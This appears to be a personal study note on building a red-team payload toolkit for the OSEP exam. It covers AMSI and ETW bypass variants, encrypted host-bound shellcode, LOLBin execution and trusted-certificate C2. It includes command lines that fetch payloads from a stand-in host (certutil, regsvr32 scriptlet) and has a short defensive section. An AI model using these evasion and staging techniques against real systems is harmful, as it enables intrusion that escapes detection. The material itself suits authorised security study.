---
title: OSEP payload development toolkit
slug: osep-payload-development-toolkit
aliases: [osep-payload-toolkit, pen300-payload-toolkit]
---

> **TL;DR:** A personal OSEP payload toolkit is less about one perfect loader and more about a repeatable build pipeline: a shellcode runner you understand line-by-line, swappable AMSI / ETW patch modules (see [[amsi-memory-patching-deep]] and [[etw-tampering-deep]]), encrypted-payload-in-resource staging, LOLBin and signed-binary execution paths for [[applocker-bypass-techniques]] / [[wldp-bypass]] environments, and a Makefile or `just` recipe that compiles, signs, and ships variants in seconds. Pair it with [[osep-exam-strategy-and-pacing]], [[hells-halos-tartarus-gates-comparison]], [[syscall-direct-and-indirect]], and your favourite from [[c2-frameworks]].

## Why it matters

The OSEP / PEN-300 exam (and any modern assumed-breach engagement) does not test whether you can paste a Cobalt Strike beacon. It tests whether, when Defender flags your loader at 02:00, you can swap an AMSI variant, recompile, re-sign, and redeploy without losing your shell. The differentiator is the toolkit, not the tradecraft buzzwords.

Operators who walk into the exam with a tidy `payloads/` repo - one runner per language, parameterised by Jinja or sed, with CI that produces signed artifacts - rarely fail on payload delivery. Operators who Google "AMSI bypass GitHub" during the exam usually do. Build the kit during preparation, not during the engagement.

A good toolkit also pays back on real jobs: the same scaffolding handles initial access via [[office-vba-macros-initial-access]] / [[jscript-hta-wsh-initial-access]], lateral movement via [[dll-side-loading]] and [[com-hijacking]], and persistence stages without bespoke one-offs.

## Core components

### Shellcode runner template

Pick one primary language and one fallback. Common pairings:

- **C / C++** with MSVC - smallest, easiest to sign, best for [[syscall-direct-and-indirect]] integration via SysWhispers3 or HellsLib.
- **Nim** - high-level ergonomics, good FFI to Win32, NimPlant-style projects show what's possible. Defender signatures for Nim binaries fluctuate; keep two builds.
- **Rust** - increasingly viable, decent inline ASM for syscalls, larger binaries but cleaner string obfuscation via `obfstr`.
- **C#** - for [[applocker-bypass-techniques]] via MSBuild / InstallUtil paths, and for Cobalt-style execute-assembly tradecraft.

The runner skeleton has four jobs: allocate, decrypt, optionally patch AMSI / ETW, execute. Keep allocation behind a configurable strategy enum (`VirtualAlloc`, `NtAllocateVirtualMemory` via syscall, mapped section, module stomping) so you can swap without rewriting.

### AMSI bypass module (multiple variants)

One variant is brittle. Defender signatures for `AmsiScanBuffer` patches rotate, and ETW-based AMSI providers (see [[amsi-providers-tampering]]) need different approaches. Carry at least:

1. **Memory patch on `AmsiScanBuffer`** - classic `0xC3` / `mov eax, 0x80070057; ret` overwrite. Document the offset hash for current Win11 builds. Details in [[amsi-memory-patching-deep]].
2. **`amsiContext` corruption** - flip the signature field so AMSI rejects its own context.
3. **Hardware breakpoint** based - vectored exception handler that returns clean on every scan call. Survives memory integrity checks.
4. **COM unregister** - clear `HKCU\Software\Classes\CLSID\{...}` to force AMSI to fail open in some PowerShell hosts.

Wrap each in a uniform `bool bypass_amsi(void)` interface so the runner picks one at compile time via a `-DBYPASS_VARIANT=2` flag.

### ETW disable

Companion to AMSI. See [[etw-bypass]] and [[etw-tampering-deep]] for the deep dive. Minimum toolkit:

- `NtTraceEvent` patch (single-byte `ret`).
- `EtwEventWrite` patch.
- ETW-TI bypass via `NtSetInformationProcess` if running on a token that allows it.

Same modular interface as AMSI. Compile-time selectable.

### Encrypted-payload-in-resource pattern

Embed the shellcode as an encrypted PE resource (RCDATA) rather than a byte array in `.data`. Two benefits: section-level entropy looks more like legitimate compressed assets, and AV emulators frequently skip resource sections during static scan.

Pattern:

- Build script encrypts shellcode with AES-256-CBC (or ChaCha20) using a key derived from a host-bound value (machine GUID, domain SID) so sandboxes detonate to garbage.
- Runner uses `FindResource` / `LoadResource` / `LockResource` to retrieve, decrypts in place, executes.
- Use `rcedit` or `windres` from the build pipeline so the encrypted blob is a build artifact, not committed.

Host-binding is a [[osep-exam-strategy-and-pacing]] consideration too: the exam network typically lets you pin to specific domain attributes.

### Certutil-encoded fallback

When the network blocks raw EXE transfer but allows text files, `certutil -encode` / `-decode` produces base64 chunks that traverse most proxies. Keep a one-liner in your kit:

```cmd
certutil -urlcache -split -f https://your.host/payload.b64 p.b64
certutil -decode p.b64 p.exe
```

Yes, it is loud. It is also reliable when WebDAV, SMB, and BITS are all blocked. Pair with [[payload-staging]] for staged delivery.

### In-memory PE loader

Reflective loaders (sRDI-style) let you execute a full PE without writing to disk. Donut and PE2SHC are the public staples; write your own once so you understand IAT resolution, relocations, and TLS callbacks. The OSEP exam often rewards a runner that can take an existing tool (Rubeus, SharpHound) and execute it in-memory rather than dropping the binary.

Useful for [[edr-hooks-and-unhooking]] flows where you load a clean copy of `ntdll` from disk and use it as a syscall source.

### AppLocker / WDAC consideration

Two paths:

**Signed-binary path.** If WDAC enforces only signed code, your loader must be signed with a cert in the allowed publisher list - usually impossible on a real engagement. Fall back to abusing already-signed Microsoft binaries (MSBuild, InstallUtil, regsvr32, mshta, cdb.exe) to execute your code. See [[applocker-bypass-techniques]] and [[wldp-bypass]].

**LOLBin path.** Maintain a small lab of LOLBin templates in the toolkit:

- `MSBuild.exe` with inline `Microsoft.Build.Tasks.Hosting` task running C# at build time.
- `InstallUtil.exe /U` invoking a `Uninstall` override on a managed assembly.
- `regsvr32 /u /s /n /i:https://host/file.sct scrobj.dll` - blocked in default WDAC but useful for AppLocker-only environments.
- `cdb.exe` with a debugger script that runs shellcode.

Each template is parameterised by the shellcode blob from the build pipeline.

### Certificate-signed C2

Modern blueteam tooling alerts on self-signed TLS. Use a Let's Encrypt certificate with the full LE intermediate chain on your redirector. Automation:

- `certbot` with DNS-01 challenge so you can issue certs for any subdomain you control without exposing port 80.
- Renewal hook restarts your C2 listener (Sliver / Havoc / Mythic - see [[sliver-c2-deep]], [[havoc-c2-deep]], [[mythic-framework-deep]]).
- Domain fronting or CDN passthrough if the target environment hates `letsencrypt.org` in CT logs - watch the trend with [[phishing-infrastructure-design]].

A signed cert plus a believable redirector hostname removes the most common detection: "weird self-signed cert on 443".

## Build automation

### Makefile / just

A `justfile` per payload is more readable than make for most operators:

```text
build VARIANT="1":
    nim c -d:release -d:amsi_variant={{ '{{' }}VARIANT{{ '}}' }} -o:out/loader.exe src/loader.nim
    signtool sign /f cert.pfx /p $PFX_PASS out/loader.exe
```

Wrap in raw / endraw Liquid if you copy this verbatim to a Jekyll note. The point is one command produces a signed, ready-to-deploy artifact with the AMSI variant of your choice.

### CI for signing automation

A private GitHub Actions or self-hosted runner that:

1. Pulls the encrypted shellcode artifact from a private bucket.
2. Builds each variant.
3. Signs with an EV or DV cert stored in the runner's TPM-backed keystore.
4. Uploads to the staging host with a unique hash filename.

For an exam scenario you obviously cannot use external CI - but the local `just` recipe should mirror the CI steps so muscle memory transfers.

## Testing methodology

### Lab against Defender + AMSI

Set up a Windows 11 + Defender VM with cloud-delivered protection enabled. Test every variant:

- Static scan: `MpCmdRun.exe -Scan -ScanType 3 -File loader.exe`.
- Dynamic: detonate the loader inside the VM with Sysmon + ProcMon logging.
- AMSI: invoke from PowerShell (`Add-Type` reflection) to confirm bypass works in-host.

Track results in a CSV: variant, build date, AMSI bypass id, ETW bypass id, Defender static result, runtime result, sample hash. The CSV becomes your decision matrix at 02:00.

### Lab against a free EDR tier

Elastic Defend, LimaCharlie community, or Wazuh give you behavioural detection. Run the variants and read the alerts. Anything that flags on "suspicious memory allocation followed by `CreateThread`" needs a [[syscall-direct-and-indirect]] path. Anything that flags on parent-child anomalies needs [[parent-pid-spoofing]].

## Defensive baseline

If you read this as a defender:

- AMSI + Defender + ETW-TI catches the majority of generic loaders. The OSEP-tier loaders described here defeat AMSI and ETW; you need behavioural and memory-scanning telemetry.
- Block writable+executable memory transitions where possible. Memory scanning at quiescence (PE-Sieve, Moneta) catches stomped modules.
- Enforce WDAC in audit mode first to inventory LOLBin usage, then move to enforce. AppLocker alone is bypassable via the publisher rule loopholes documented in [[applocker-bypass-techniques]].
- Watch for newly issued LE certs on lookalike domains via CT log monitoring.
- Detection-engineering ideas in [[detection-engineering-pyramid-of-pain]].

## Workflow to study

1. Build the C runner first. Make it work with raw shellcode in `.data`, `VirtualAlloc`, no obfuscation. Confirm it pops calc.
2. Add one AMSI variant. Test in lab. Add a second.
3. Add ETW patch. Re-test.
4. Move shellcode to encrypted resource. Add host-binding.
5. Port to a second language (Nim or Rust). Same module structure.
6. Add a LOLBin path (MSBuild template).
7. Stand up a redirector with LE cert and a public C2 of your choice.
8. Write the `justfile`. Confirm one command produces a signed, deployable artifact for each variant.
9. Run the full Defender + EDR lab matrix. Record results.
10. Rehearse the "Defender just caught me, swap variant" loop until it takes under 60 seconds.

## Post-engagement cleanup

OSEP exam reports require an artefact-list section. Build the habit now:

- Maintain a `deployed.csv` per engagement: timestamp, host, payload hash, install path, scheduled task / service name, registry persistence keys.
- Cleanup script per persistence type (`schtasks /delete`, `sc delete`, `reg delete`).
- Wipe redirector logs and tear down DNS records.
- Rotate certs - never reuse engagement certs.

This also matters for [[oscp-exam-methodology]] muscle memory: clean engagement records make report writing trivial.

## Related

- [[osep-roadmap]]
- [[osep-exam-strategy-and-pacing]]
- [[amsi-bypass]]
- [[amsi-memory-patching-deep]]
- [[amsi-providers-tampering]]
- [[etw-bypass]]
- [[etw-tampering-deep]]
- [[hells-halos-tartarus-gates-comparison]]
- [[syscall-direct-and-indirect]]
- [[edr-hooks-and-unhooking]]
- [[applocker-bypass-techniques]]
- [[wldp-bypass]]
- [[dll-side-loading]]
- [[com-hijacking]]
- [[parent-pid-spoofing]]
- [[process-injection-techniques]]
- [[payload-staging]]
- [[c2-frameworks]]
- [[sliver-c2-deep]]
- [[havoc-c2-deep]]
- [[mythic-framework-deep]]
- [[phishing-infrastructure-design]]
- [[office-vba-macros-initial-access]]
- [[jscript-hta-wsh-initial-access]]
- [[detection-engineering-pyramid-of-pain]]

## References

- https://www.offsec.com/courses/pen-300/
- https://github.com/boku7/azurelitivirus
- https://github.com/klezVirus/SysWhispers3
- https://github.com/TheWover/donut
- https://lolbas-project.github.io/
- https://letsencrypt.org/docs/certificates-for-localhost/
